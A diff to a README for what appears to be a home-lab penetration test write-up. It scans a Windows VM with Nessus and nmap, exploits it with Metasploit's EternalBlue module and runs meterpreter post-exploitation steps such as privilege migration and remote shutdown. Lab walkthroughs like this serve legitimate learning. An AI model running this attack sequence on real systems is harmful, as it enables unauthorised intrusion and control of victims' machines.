@@ -59,7 +59,7 @@ https://www.kali.org/get-kali/#kali-platforms
 ## Steps-by-steps Process
 ### Setup Oracle virtual box
 
-  ![After_Shutdownd](Screenshot/After_shutdown_command.PNG)
+  ![oracle_virtual_box.PNG](Screenshot/oracle_virtual_box.PNG)
 
 
 ### Command:
@@ -71,7 +71,7 @@ ping 192.168.0.141
 
 ping 192.168.0.78
 
- ![After_Shutdownd](Screenshot/After_shutdown_command.PNG)
+ ![Ping Command](Screenshot/Ping_test.PNG)
  
 
 **Successful ping**
@@ -80,18 +80,18 @@ ping 192.168.0.78
 
 https://localhost:8834
 
-![After_Shutdownd](Screenshot/After_shutdown_command.PNG)
+![start_nessusd](Screenshot/start_nessusd.PNG)
  
 
 ### Vulnerability report
 
- ![After_Shutdownd](Screenshot/After_shutdown_command.PNG)
+ ![Vulnerability_Report](Screenshot/Vulnerability_Report.PNG)
 
 ### Nmap 
 
 nmap 192.168.0.141
  
- ![After_Shutdownd](Screenshot/After_shutdown_command.PNG)
+ ![nmap.PNG](Screenshot/nmap.PNG)
 
 
 ## Exploitation
@@ -100,19 +100,19 @@ nmap 192.168.0.141
 
 **Msfconsole**
 
-  ![After_Shutdownd](Screenshot/After_shutdown_command.PNG)
+  ![msfconsole](Screenshot/msfconsole.PNG)
 
 **search ms1_010**
 
-  ![After_Shutdownd](Screenshot/After_shutdown_command.PNG)
+  ![search_ms17_010](Screenshot/search_ms17_010.PNG)
   
 **use exploit/windows/smb/ms17_010_eternalblue**
  
- ![After_Shutdownd](Screenshot/After_shutdown_command.PNG)
+ ![use](Screenshot/use.PNG)
  
 **option command**
  
- ![After_Shutdownd](Screenshot/After_shutdown_command.PNG)
+ ![Option_command](Screenshot/Option_command.PNG)
 
  
 LHOST: 192.168.0.78
@@ -121,7 +121,7 @@ RHOST: 192.168.0.141 (Victim)
 
 RPORT: 445
  
- ![After_Shutdownd](Screenshot/After_shutdown_command.PNG)
+ ![meterpreter](Screenshot/meterpreter.PNG)
 
  
 ## Post exploitation
@@ -130,29 +130,32 @@ RPORT: 445
 
 **Meterpreter > getuid = Displays the username that the Meterpreter session is running as.**
 
- ![After_Shutdownd](Screenshot/After_shutdown_command.PNG)
+ ![Get_system_information](Screenshot/Get_system_information.PNG)
 
 ### System Information
 
- ![After_Shutdownd](Screenshot/After_shutdown_command.PNG)
+ ![system_information.PNG](Screenshot/system_information.PNG)
 
  
 ### Getting high level privilege
 Meterpreter > run post/windows/manage/priv_migrate = get more privileged access
 
- ![After_Shutdownd](Screenshot/After_shutdown_command.PNG) 
+ ![privileged_access](Screenshot/privileged_access.PNG) 
 
 ### Screenshot command
  
- ![After_Shutdownd](Screenshot/After_shutdown_command.PNG)
+ ![Screenshot_Command](Screenshot/Screenshot_Command.PNG)
  
 ### Going into Desktop
  
- ![After_Shutdownd](Screenshot/After_shutdown_command.PNG)
+ ![windows_Remote_Desktop.](Screenshot/windows_Remote_Desktop.PNG)
  
 ### Creating folder
  
- ![After_Shutdownd](Screenshot/After_shutdown_command.PNG)
+ ![creating_folder_remotely](Screenshot/creating_folder_remotely.PNG)
+
+ 
+ ![creating_folder_remotely](Screenshot/creating_folder_remotely.PNG)
  
 
 ### Shutdown command
